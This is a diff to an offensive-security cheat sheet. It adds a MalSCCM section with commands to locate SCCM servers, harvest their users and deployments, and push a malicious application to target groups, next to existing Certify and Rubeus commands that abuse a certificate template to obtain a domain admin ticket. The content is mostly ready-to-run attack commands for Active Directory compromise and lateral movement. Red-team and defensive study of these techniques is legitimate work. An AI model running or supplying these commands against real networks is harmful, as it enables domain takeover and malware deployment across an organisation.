@@ -478,6 +478,23 @@ execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTempl
 # Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus
 execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
 ```
+
+### [MalSCCM](https://github.com/nettitude/MalSCCM) - Exploiting SCCM servers to deploy malicious applications
+- Requires admin privileges on target SCCM server
+```
+# Find the SCCM management servers
+execute-assembly C:\MalSCCM.exe locate
+
+# Check if the current host is an SCCM client
+execute-assembly C:\MalSCCM.exe
+
+# Gather all info from SCCM including users, groups, forest, application, deployments
+execute-assembly C:\MalSCCM.exe inspect /all /server:<PrimarySiteFQDN>
+
+# You can use MalSCCM to deploy a malicious application to a target group then force the users to check-in and run your payload
+# This is explained in MUCH more details in the walkthrough here: https://labs.nettitude.com/blog/introducing-malsccm/
+```
+
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
 
